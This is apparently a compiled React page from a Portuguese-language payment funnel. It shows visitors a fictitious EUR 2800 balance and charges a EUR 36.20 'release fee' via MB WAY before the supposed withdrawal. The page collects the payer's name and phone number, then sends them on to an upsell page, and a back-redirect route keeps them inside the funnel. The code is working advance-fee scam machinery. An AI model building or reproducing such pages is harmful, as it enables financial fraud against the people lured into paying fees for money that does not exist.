import{r as React,j as jsx,m as useNavigate,o as useLocation,p as LoaderIcon}from"./index-jPJOmtKw.js";
import{u as useMbway}from"./use-mbway-system.js";
import{c as coinIcon}from"./coin-p-BTqgdHPT.js";

const money=value=>`EUR ${Number(value||0).toLocaleString("pt-PT",{minimumFractionDigits:2})}`;

function WithdrawConfirm(){
  const navigate=useNavigate();
  const location=useLocation();
  const saved=(()=>{try{return JSON.parse(sessionStorage.getItem("ttk_confirmar_state")||"null")}catch{return null}})();
  const state=location.state||saved||{amount:"2800",MBWAYKeyType:"phone",MBWAYKey:""};
  React.useEffect(()=>{try{sessionStorage.setItem("ttk_confirmar_state",JSON.stringify(state))}catch{}},[]);
  const amount=Number(state.amount||2800);
  const fee=Number(window.__FUNIL_FEE_FRONT||36.2);
  const [name,setName]=React.useState("");
  const [key,setKey]=React.useState(state.MBWAYKey||"");
  const [error,setError]=React.useState("");
  const {loading,mbwayData,mbwayTimer,handlePay}=useMbway({amountInCents:Math.round(fee*100),redirectTo:"/upsell-1",customerData:state.customerData,extraState:state});
  const goBack=()=>navigate("/back-redirect",{state,replace:true});
  const submit=()=>{
    if(!name.trim()||!key.trim()){setError("Preencha o nome e a chave MB WAY para continuar.");return;}
    setError("");
    try{localStorage.setItem("mbway_payer",JSON.stringify({name,phone:key,number:key,method:"mbway"}))}catch{}
    handlePay("mbway");
  };
  return jsx.jsxs("div",{className:"min-h-screen bg-[#F5F5F5] max-w-[430px] mx-auto pb-8",children:[
    jsx.jsxs("header",{className:"h-[56px] flex items-center justify-between px-4 bg-white sticky top-0 z-50 shadow-sm",children:[
      jsx.jsx("button",{onClick:goBack,className:"text-foreground text-[24px]",children:"‹"}),
      jsx.jsx("h1",{className:"font-bold text-[17px] text-foreground",children:"Confirmacao de levantamento"}),
      jsx.jsx("div",{className:"w-6"})
    ]}),
    jsx.jsxs("section",{className:"mx-4 mt-4 bg-foreground rounded-[18px] p-5 text-white relative overflow-hidden",children:[
      jsx.jsx("p",{className:"text-white/75 text-[14px]",children:"Saldo disponivel"}),
      jsx.jsx("p",{className:"text-white text-[38px] font-extrabold mt-1",children:money(amount)}),
      jsx.jsx("p",{className:"text-white/60 text-[13px]",children:"Aguardando confirmacao via MB WAY"}),
      jsx.jsx("img",{src:coinIcon,alt:"",className:"absolute right-4 top-4 w-[86px] h-[86px]"})
    ]}),
    jsx.jsxs("section",{className:"mx-4 mt-4 bg-white rounded-[16px] p-5 shadow-sm",children:[
      jsx.jsx("p",{className:"text-muted-foreground text-[12px] uppercase tracking-wide font-bold",children:"Taxa de libertacao"}),
      jsx.jsx("p",{className:"text-[#10B981] text-[30px] font-extrabold mt-1",children:money(fee)}),
      jsx.jsx("p",{className:"text-muted-foreground text-[14px] leading-relaxed mt-2",children:"Este valor e usado para validar o pedido e liberar o levantamento imediatamente."})
    ]}),
    !mbwayData&&jsx.jsxs("section",{className:"mx-4 mt-4 bg-white rounded-[16px] p-5 space-y-3",children:[
      jsx.jsx("input",{value:name,onChange:e=>setName(e.target.value),placeholder:"Nome completo",className:"w-full h-[48px] rounded-[12px] border border-[#E5E7EB] px-4 text-[14px] outline-none"}),
      jsx.jsx("input",{value:key,onChange:e=>setKey(e.target.value),placeholder:"Numero MB WAY",className:"w-full h-[48px] rounded-[12px] border border-[#E5E7EB] px-4 text-[14px] outline-none"}),
      error&&jsx.jsx("p",{className:"text-pink text-[13px] text-center font-semibold",children:error}),
      jsx.jsx("button",{onClick:submit,disabled:loading,className:"w-full h-[56px] bg-pink text-white font-bold text-[15px] rounded-[14px] flex items-center justify-center gap-2 disabled:opacity-60",children:loading?jsx.jsx(LoaderIcon,{size:22,className:"animate-spin"}):"CONFIRMAR E LIBERAR"})
    ]}),
    mbwayData&&jsx.jsxs("section",{className:"mx-4 mt-4 bg-white rounded-[16px] p-5 text-center",children:[
      jsx.jsx("p",{className:"text-foreground font-bold",children:"Pagamento MB WAY criado"}),
      jsx.jsx("p",{className:"text-muted-foreground text-[13px] mt-2",children:"Confirme o pagamento no aplicativo para continuar."}),
      mbwayTimer&&jsx.jsxs("p",{className:"text-pink font-bold mt-3",children:["Expira em ",mbwayTimer]})
    ]})
  ]});
}

export{WithdrawConfirm as default};
